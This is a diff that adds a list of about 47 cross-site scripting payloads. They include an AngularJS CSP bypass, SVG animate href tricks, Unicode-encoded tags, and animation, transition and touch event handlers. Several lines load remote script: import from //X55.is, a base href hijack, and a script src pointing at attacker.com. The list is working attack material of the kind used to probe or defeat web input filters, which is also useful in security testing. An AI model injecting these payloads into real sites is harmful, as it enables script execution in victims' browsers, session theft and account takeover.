@@ -1,0 +1,47 @@
+</script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}
+<svg><a><rect width=99% height=99% /><set attributeName=href to=javascript:alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=href values=javascript:alert(1)>
+<svg><a><rect width=99% height=99% /><animate attributeName=href to=0 from=javascript:alert(1)>
+%u003Csvg onload=alert(1)>
+%u3008svg onload=alert(2)>
+%uFF1Csvg onload=alert(3)>
+<%S%v%g%%20%O%n%L%o%a%d%=%a%l%e%r%t%%28%1%%29%>
+<!--><svg onload=alert(1)-->
+<svg id=//X55.is onload=import(id)>
+<img src=//X55.is onload=import(src)>
+<k onanimationend=alert(1)><style>*{animation:s}@keyframes s{}
+<k onanimationstart=alert(1)><style>x{animation:s}@keyframes s{}
+<k onwebkitanimationend=alert(1)><style>*{animation:s}@keyframes s{}
+<k onwebkitanimationstart=alert(1)><style>*{animation:s}@keyframes s{}
+<k ontransitionend=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<k ontransitionrun=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<k ontransitionstart=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+<k ontransitioncancel=alert(1)><style>*{transition:color 1s}*:hover{color:red}
+12345678901<svg/onload=alert(1)>
+1234567890123456789<svg/onload=alert(1)>
+1234567890123456789012345678901234567890123<svg/onload=alert(1)>
+"><svg/onload=alert(1)>"@x.y
+<html ontouchstart=alert(1)>
+<html ontouchend=alert(1)>
+<html ontouchmove=alert(1)>
+<body onorientationchange=alert(1)>
+onload=alert(1)>
+onloadend=alert(1)>
+onloadstart=alert(1)>
+<base href=//X55.is>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<video ontimeupdate=alert(1) controls src=//brutelogic.com.br/x.mp4>
+<input autofocus onblur=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<object onerror=alert(1)>
+<marquee onstart=alert(1)>
+<script>alert('XSS');</script>
+<img src="x" onmouseover="alert('XSS');">
+<script>document.body.innerHTML = '<img src="x" onerror="alert('XSS')">';</script>
+<a href="javascript:alert('XSS')">Click me!</a>
+<script src="data:text/javascript;base64,PHNjcmlwdD5hbGVydCgnW1hTU10nKTwvc2NyaXB0Pg=="></script>
+<script src="http://attacker.com/maliciouscallback?callback=alert('XSS')"></script>
+<script>%3Cscript%3Ealert('XSS')%3C%2Fscript%3E</script>
+<img src="x" onerror="alert(String.fromCharCode(88,83,83));">
